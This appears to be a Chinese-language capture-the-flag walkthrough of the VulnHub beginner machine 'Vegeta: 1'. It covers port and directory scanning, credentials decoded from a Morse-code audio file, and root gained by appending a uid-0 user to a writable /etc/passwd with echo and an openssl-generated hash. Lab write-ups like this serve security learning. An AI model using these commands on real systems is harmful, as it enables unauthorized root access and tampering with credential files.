# Vegeta: 1

2024-5-21 https://www.vulnhub.com/entry/vegeta-1,501/

difficulty: BEGINNER

## IP

192.168.5.29

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1f3130673f08302e6daee3209ebd6bba (RSA)
|   256 7d8855a86f56c805a47382dcd8db4759 (ECDSA)
|_  256 ccdede4e84a891f51ad6d2a62e9e1ce0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

80 web 首页是张赛亚人图片，源代码没其他信息，使用 gobuster 进行扫描：

```
gobuster dir -t 64 -u http://192.168.5.29/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://192.168.5.29/index.html           (Status: 200) [Size: 119]
http://192.168.5.29/login.php            (Status: 200) [Size: 0]
http://192.168.5.29/img                  (Status: 301) [Size: 310] [--> http://192.168.5.29/img/]
http://192.168.5.29/image                (Status: 301) [Size: 312] [--> http://192.168.5.29/image/]
http://192.168.5.29/admin                (Status: 301) [Size: 312] [--> http://192.168.5.29/admin/]
http://192.168.5.29/manual               (Status: 301) [Size: 313] [--> http://192.168.5.29/manual/]
http://192.168.5.29/robots.txt           (Status: 200) [Size: 11]
http://192.168.5.29/bulma                (Status: 301) [Size: 312] [--> http://192.168.5.29/bulma/]
```

http://192.168.5.29/robots.txt 显示:

```
*
/find_me
```

访问下 /find_me 目录，看看有什么，在 html 源代码的最底部，发现一串 base64 字符串，进行解码后没看出什么内容，这里暂时没思路，也有可能是坑。

http://192.168.5.29/bulma 中有一个 hahahaha.wav 的音频，是一段摩尔斯电码，尝试进行解密，直接利用了网上在线的解密平台 https://morsecode.world/international/decoder/audio-decoder-adaptive.html，将wmv音频上传，解码后得到明文:

```
USER : TRUNKS PASSWORD : US3R <KN> S IN DOLLARS SYMBOL)
```

像是个 ssh 的密钥，但是需要把 S 替换成 $ 符号。trunks:u$3r 登陆成功。

进行系统枚举，sudo 和 suid 都没有特别的程序，crontab 中也没有自定义的系统任务。

当前目录发现.bash_history 文件：

```
trunks@Vegeta:~$ cat .bash_history
perl -le ‘print crypt(“Password@973″,”addedsalt”)’
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
ls
su Tom
ls -la
cat .bash_history
sudo apt-get install vim
apt-get install vim
su root
cat .bash_history
exit
```

/etc/passwd 中没有 tom 这个用户，但是可能 root 的密码还是:Password@973，尝试后发现不对。

查看/etc/passwd 权限：

```
trunks@Vegeta:/$ ls -al /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd
```

结果我们有写入权限，所以直接像上面的内容一样，添加一个超级用户，凭据为 tom:123 ：

```
trunks@Vegeta:/$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

echo 'tom:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:User_like_root:/root:/bin/bash' >> /etc/passwd

trunks@Vegeta:/$ su tom
Password:
root@Vegeta:/# cd /root
root@Vegeta:~# ls
root.txt
root@Vegeta:~# cat root.txt

                               ,   ,'|
                             ,/|.-'   \.
                          .-'  '       |.
                    ,  .-'              |
                   /|,'                 |'
                  / '                    |  ,
                 /                       ,'/
              .  |          _              /
               \`' .-.    ,' `.           |
                \ /   \ /      \          /
                 \|    V        |        |  ,
                  (           ) /.--.   ''"/
                  "b.`. ,' _.ee'' 6)|   ,-'
                    \"= --""  )   ' /.-'
                     \ / `---"   ."|'
  V E G I I T A       \"..-    .'  |.
                       `-__..-','   |
                     _.) ' .-'/    /\.
               .--'/----..--------. _.-""-.
            .-')   \.   /     _..-'     _.-'--.
           / -'/      """""""""         ,'-.   . `.
          | ' /                        /    `   `. \
          |   |                        |         | |
           \ .'\                       |     \     |
          / '  | ,'               . -  \`.    |  / /
         / /   | |                      `/"--. -' /\
        | |     \ \                     /     \     |
 	 | \      | \                  .-|      |    |


Hurray you got root

Share your screenshot in telegram : https://t.me/joinchat/MnPu-h3Jg4CrUSCXJpegNw
```
